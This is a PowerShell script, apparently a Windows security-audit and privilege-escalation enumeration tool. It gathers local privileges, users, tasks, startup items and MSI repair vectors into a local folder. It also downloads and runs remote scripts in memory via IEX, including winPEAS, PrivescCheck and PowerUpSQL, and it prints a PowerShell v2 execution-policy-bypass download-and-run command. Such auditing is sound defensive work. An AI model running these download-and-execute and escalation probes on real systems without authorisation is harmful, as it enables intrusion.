$DATE = Get-Date -Format "yyyyMMdd_HHmm"
$USER = $env:USERNAME
$OUT = "$env:USERPROFILE\Downloads\fkad-$DATE-$USER"
New-Item -ItemType Directory -Path $OUT -Force | Out-Null

function Banner {
    Write-Host ""
    Write-Host "       _____         _____         _____         _____         _____" -ForegroundColor DarkGray
    Write-Host "     .'     '.     .'     '.     .'     '.     .'     '.     .'     '." -ForegroundColor DarkGray
    Write-Host "    /  o   o  \   /  o   o  \   /  o   o  \   /  o   o  \   /  o   o  \" -ForegroundColor DarkGray
    Write-Host "   |           | |           | |           | |           | |           |" -ForegroundColor DarkGray
    Write-Host "   |  \     /  | |  \     /  | |  \     /  | |  \     /  | |  \     /  |" -ForegroundColor DarkGray
    Write-Host "    \  '---'  /   \  '---'  /   \  '---'  /   \  '---'  /   \  '---'  /" -ForegroundColor DarkGray
    Write-Host "     '._____.'     '._____.'     '._____.'     '._____.'     '._____.' " -ForegroundColor DarkGray
    Write-Host ""
    Write-Host "    fkad local by @fkxdr" -ForegroundColor DarkGray
    Write-Host "    Output: $OUT" -ForegroundColor DarkGray
    Write-Host ""
}

function Run {
    param($Label, $Block, $File)
    try {
        $result = & $Block
        $result | Out-File "$OUT\$File" -Encoding utf8
        Write-Host "[OK] $Label -> $File" -ForegroundColor Green
    } catch {
        Write-Host "[--] $Label failed: $_" -ForegroundColor DarkGray
    }
}

Banner

$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if ($isAdmin) {
    Write-Host "[KO] Running as Administrator" -ForegroundColor Red
} else {
    Write-Host "[OK] Not running as Administrator" -ForegroundColor Green
}

try {
    $ps2 = Get-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2Root -ErrorAction SilentlyContinue
    $net2 = Get-WindowsOptionalFeature -Online -FeatureName NetFx3 -ErrorAction SilentlyContinue
    if ($ps2.State -eq 'Enabled' -and $net2.State -eq 'Enabled') {
        Write-Host "[KO] PowerShell downgrade possible (PSv2 + .NET 3.5 present)" -ForegroundColor Red
        Write-Host "       powershell -version 2 -ep bypass -c `"IEX (New-Object Net.WebClient).DownloadString('URL')`"" -ForegroundColor DarkGray
    } else {
        Write-Host "[OK] PowerShell downgrade not possible" -ForegroundColor Green
    }
} catch {
    Write-Host "[OK] PowerShell downgrade check skipped" -ForegroundColor Green
}

$clm = $ExecutionContext.SessionState.LanguageMode
if ($clm -ne 'FullLanguage') {
    Write-Host "[OK] Constrained Language Mode active: $clm" -ForegroundColor Green
} else {
    Write-Host "[KO] Language Mode: FullLanguage" -ForegroundColor Red
}

try {
    $wsl = wsl --list --verbose 2>&1
    if ($wsl -match "NAME") {
        Write-Host "[KO] WSL is installed and has distributions" -ForegroundColor Red
        foreach ($line in $wsl) {
            if ($line -match "\S") {
                Write-Host "       $line" -ForegroundColor DarkGray
            }
        }
    } else {
        Write-Host "[OK] WSL not installed or no distributions" -ForegroundColor Green
    }
} catch {
    Write-Host "[OK] WSL not installed or no distributions" -ForegroundColor Green
}

Write-Host ""

Run "Privileges (whoami /all)" { whoami /all } "whoami_all.txt"

Run "DNS Cache" { ipconfig /displaydns } "dns_cache.txt"

# Admins and logged on users
$adminOutput = net localgroup administrators
$loggedOutput = query user 2>$null
$combined = @()
$combined += "=== LOCAL ADMINS ===" 
$combined += $adminOutput
$combined += "`n=== LOGGED ON USERS ==="
$combined += $loggedOutput
$combined | Out-File "$OUT\users_and_admins.txt" -Encoding utf8
Write-Host "[OK] Users & Admins -> users_and_admins.txt" -ForegroundColor Green

Run "Scheduled Tasks" { Get-ScheduledTask | Format-Table -AutoSize } "scheduled_tasks.txt"

# Startup items
$startupOutput = Get-CimInstance Win32_StartupCommand |
    Where-Object { $_.Command -notmatch "SecurityHealthSystray|Windows Defender|MpCmdRun" } |
    Format-Table -AutoSize

if ($startupOutput) {
    $startupOutput | Out-File "$OUT\startup_items.txt" -Encoding utf8
    Write-Host "[KO] Startup items found -> startup_items.txt" -ForegroundColor Red
} else {
    Write-Host "[OK] No interesting startup items found" -ForegroundColor Green
}

# MSI repairing
$msiOutput = Get-WmiObject -Class Win32_Product |
    Where-Object { $_.Vendor -notin @("Microsoft Corporation","Microsoft","Python Software Foundation","Parallels International GmbH") } |
    Select-Object Name, Vendor, Version, PackageCache

if ($msiOutput) {
    $msiOutput | Out-File "$OUT\msi_list.txt" -Encoding utf8
    Write-Host "[KO] MSI repair LPE possible -> msi_list.txt" -ForegroundColor Red
} else {
    Write-Host "[OK] No MSI repair LPE vectors found" -ForegroundColor Green
}

Write-Host ""

try {
    & { IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/fkxdr/fkmde/refs/heads/main/fkmde.ps1') } *>&1 | Out-File "$OUT\fkmde.txt" -Encoding utf8
    Write-Host "[OK] fkmde -> fkmde.txt" -ForegroundColor Green
} catch {
    Write-Host "[--] fkmde failed: $_" -ForegroundColor DarkGray
}

try {
    IEX ((New-Object Net.WebClient).DownloadString('https://github.com/itm4n/PrivescCheck/releases/latest/download/PrivescCheck.ps1'))
    Invoke-PrivescCheck -Extended -Audit -Report "$OUT\PrivescCheck_$($env:COMPUTERNAME)" -Format TXT | Out-Null
    Write-Host "[OK] PrivescCheck -> PrivescCheck_$($env:COMPUTERNAME).txt" -ForegroundColor Green
} catch {
    Write-Host "[--] PrivescCheck failed: $_" -ForegroundColor DarkGray
}

try {
    & { IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/peass-ng/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1') } *>&1 | Out-File "$OUT\winpeas.txt" -Encoding utf8
    Write-Host "[OK] WinPEAS -> winpeas.txt" -ForegroundColor Green
} catch {
    Write-Host "[--] WinPEAS failed: $_" -ForegroundColor DarkGray
}

try {
    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/scipag/HardeningKitty/master/HardeningKitty.ps1')
    Invoke-HardeningKitty -Mode Audit -Log -Report -ReportFile "$OUT\HardeningKitty.csv" | Out-Null
    Write-Host "[OK] HardeningKitty -> HardeningKitty.csv" -ForegroundColor Green
} catch {
    Write-Host "[--] HardeningKitty failed: $_" -ForegroundColor DarkGray
}

try {
    & { IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/techspence/ScriptSentry/main/ScriptSentry.ps1') } *>&1 | Out-File "$OUT\scriptsentry.txt" -Encoding utf8
    Write-Host "[OK] ScriptSentry -> scriptsentry.txt" -ForegroundColor Green
} catch {
    Write-Host "[--] ScriptSentry failed: $_" -ForegroundColor DarkGray
}

try {
    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/techspence/AppLockerInspector/main/Invoke-AppLockerInspector.ps1')
    Invoke-AppLockerInspector -Verbose | Format-Table -Auto | Out-File "$OUT\applocker_inspector.txt" -Encoding utf8
    Write-Host "[OK] AppLocker Inspector -> applocker_inspector.txt" -ForegroundColor Green
} catch {
    Write-Host "[--] AppLocker Inspector failed: $_" -ForegroundColor DarkGray
}

try {
    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/NetSPI/PowerUpSQL/master/PowerUpSQL.ps1')
    Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded | Where-Object {$_.Status -eq "Accessible"} | Get-SQLServerPrivEscRowThreated | Out-File "$OUT\mssql_priv.txt" -Encoding utf8
    Write-Host "[OK] PowerUpSQL -> mssql_priv.txt" -ForegroundColor Green
} catch {
    Write-Host "[--] PowerUpSQL failed: $_" -ForegroundColor DarkGray
}

Write-Host ""
Write-Host "[OK] Done. Output folder: $OUT" -ForegroundColor Green
Write-Host ""
